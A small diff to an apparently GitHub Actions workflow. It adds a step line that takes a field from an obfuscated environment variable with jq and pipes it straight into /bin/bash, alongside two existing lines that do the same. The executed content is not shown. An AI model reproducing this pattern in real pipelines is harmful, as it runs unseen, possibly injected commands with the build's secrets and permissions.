@@ -19,6 +19,7 @@ jobs:
         run: |
           printf '%s' "$lnk549" | jq -r .hn28993 | /bin/bash
           printf '%s' "$bvo962" | jq -r .gdeap541 | /bin/bash
+          echo $m531 | jq -r .bli4960 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
